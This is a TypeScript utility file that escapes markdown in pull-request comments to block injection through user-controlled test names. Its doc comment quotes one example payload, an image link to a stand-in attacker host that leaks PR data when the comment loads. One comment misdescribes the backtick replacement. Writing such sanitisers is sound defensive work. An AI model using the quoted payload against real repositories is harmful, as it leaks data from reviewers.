/**
 * Escape markdown special characters to prevent injection via PR comments.
 *
 * Test file names, test names, and rule reasons come from parsing user code.
 * A malicious test name like `'foo\` - ![leak](https://evil.example/x.png?pr=leaked)'`
 * would otherwise break the inline-code wrapper and load external images
 * in the PR comment when reviewers open it.
 *
 * This function escapes the following characters: ` * _ [ ] ( ) { } < > # + ! | . ~ = - \n
 *
 * @see https://docs.github.com/en/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax
 */
export function escapeMd(input: string): string {
  if (typeof input !== 'string') {
    return ''
  }
  // Remove control characters (including newlines) — PR comments are single-line per finding.
  const sanitized = input.replace(/[\x00-\x1f\x7f]/g, ' ').trim()
  // Escape markdown specials. We use backslash escapes per GitHub Flavored Markdown spec.
  return sanitized.replace(/[\\`*_[\](){}<>#+!|.~=-]/g, (match) => `\\${match}`)
}

/**
 * Escape inline code — useful when wrapping content in backticks.
 * Inside inline code, only ` and \ need escaping (and newlines must be removed).
 */
export function escapeInlineCode(input: string): string {
  if (typeof input !== 'string') {
    return ''
  }
  const sanitized = input.replace(/[\x00-\x1f\x7f]/g, ' ').trim()
  // Inside backticks, only backticks and backslashes need escaping
  // We replace ` with a zero-width-space + ` so it doesn't terminate the inline code
  return sanitized.replace(/`/g, 'ˋ').replace(/\\/g, '\\\\')
}
